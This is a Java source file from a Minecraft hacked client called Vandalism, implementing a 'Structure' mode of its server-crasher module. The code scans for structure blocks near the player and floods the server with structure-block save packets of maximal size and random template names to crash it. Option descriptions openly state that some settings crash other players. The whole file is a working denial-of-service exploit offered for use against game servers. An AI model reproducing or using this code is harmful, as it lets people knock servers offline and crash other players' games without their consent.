/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.florianmichael.rclasses.common.RandomUtils;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.FabricBootstrap;
import de.nekosarekawaii.vandalism.base.event.game.TickGameListener;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.block.StructureBlock;
import net.minecraft.block.entity.StructureBlockBlockEntity;
import net.minecraft.block.enums.StructureBlockMode;
import net.minecraft.network.packet.c2s.play.UpdateStructureBlockC2SPacket;
import net.minecraft.util.BlockMirror;
import net.minecraft.util.BlockRotation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3i;

import java.util.ArrayList;
import java.util.List;

public class StructureModuleMode extends ModuleMulti<ServerCrasherModule> implements TickGameListener {

    private final IntegerValue range = new IntegerValue(
            this.getParent(),
            "Range",
            "The range in which the structure blocks should be searched.",
            40,
            1,
            100
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final IntegerValue maxPackets = new IntegerValue(
            this.getParent(),
            "Max Packets",
            "The maximum amount of packets that should be sent per tick.",
            2,
            1,
            100
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue randomizeTemplateName = new BooleanValue(
            this.getParent(),
            "Randomize Template Name",
            "Whether the template name should be randomized or not.",
            true
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue useUpperCaseNames = new BooleanValue(
            this.getParent(),
            "Use Upper Case Names",
            "Whether the template name can be upper case or not.",
            false
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this) && this.randomizeTemplateName.getValue());

    private final BooleanValue useSpecialCharacterNames = new BooleanValue(
            this.getParent(),
            "Use Special Character Names",
            "Whether the template name can contain special characters or not.",
            false
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this) && this.randomizeTemplateName.getValue());

    private final StringValue templateName = new StringValue(
            this.getParent(),
            "Template Name",
            "The name of the template.",
            "fucked_by_" + FabricBootstrap.MOD_ID
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this) && !this.randomizeTemplateName.getValue());

    private final IntegerValue size = new IntegerValue(
            this.getParent(),
            "Size",
            "The size of the structure.",
            48,
            -48,
            48
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue showAir = new BooleanValue(
            this.getParent(),
            "Show Air",
            "This value allows you to crash some players.",
            true
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue showBoundingBox = new BooleanValue(
            this.getParent(),
            "Show Bounding Box",
            "This value also allows you to crash some players.",
            true
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final List<BlockPos> structureBlocks = new ArrayList<>();
    private int current = 0;

    public StructureModuleMode(final ServerCrasherModule parent) {
        super("Structure", parent);
    }

    private void reset() {
        this.current = 0;
        this.structureBlocks.clear();
    }

    @Override
    public void onActivate() {
        this.reset();
        Vandalism.getInstance().getEventSystem().subscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(TickGameEvent.ID, this);
        this.reset();
    }

    @Override
    public void onTick() {
        if (this.mc.player == null) return;
        final int range = this.range.getValue();
        final int maxPackets = this.maxPackets.getValue();
        final StructureBlockBlockEntity.Action action = StructureBlockBlockEntity.Action.SAVE_AREA;
        final StructureBlockMode mode = StructureBlockMode.SAVE;
        final String templateName = this.randomizeTemplateName.getValue() ? RandomUtils.randomString(
                30,
                30,
                true,
                this.useUpperCaseNames.getValue(),
                true,
                this.useSpecialCharacterNames.getValue()
        ) : this.templateName.getValue();
        final BlockPos offset = new BlockPos(0, 1, 0);
        final Vec3i size = new Vec3i(this.size.getValue(), this.size.getValue(), this.size.getValue());
        final BlockMirror mirror = BlockMirror.NONE;
        final BlockRotation rotation = BlockRotation.NONE;
        final String metadata = "";
        final boolean ignoreEntities = false;
        final boolean showAir = this.showAir.getValue();
        final boolean showBoundingBox = this.showBoundingBox.getValue();
        final float blockIntegrity = 1.0f;
        final long randomizationSeed = 0;
        if (this.structureBlocks.isEmpty()) {
            for (int x = -range; x < range; x++) {
                for (int y = -range; y < range; y++) {
                    for (int z = -range; z < range; z++) {
                        final BlockPos blockPos = new BlockPos(
                                (int) (this.mc.player.getX() + x),
                                (int) (this.mc.player.getY() + y),
                                (int) (this.mc.player.getZ() + z)
                        );
                        if (this.mc.world.getBlockState(blockPos).getBlock() instanceof StructureBlock) {
                            this.structureBlocks.add(blockPos);
                        }
                    }
                }
            }
            this.current = 0;
            return;
        }
        for (int i = 0; i < maxPackets; i++) {
            this.mc.getNetworkHandler().sendPacket(new UpdateStructureBlockC2SPacket(
                    this.structureBlocks.get(this.current),
                    action,
                    mode,
                    templateName,
                    offset,
                    size,
                    mirror,
                    rotation,
                    metadata,
                    ignoreEntities,
                    showAir,
                    showBoundingBox,
                    blockIntegrity,
                    randomizationSeed
            ));
            if (this.current < this.structureBlocks.size() - 1) this.current++;
            else this.current = 0;
        }
    }

}
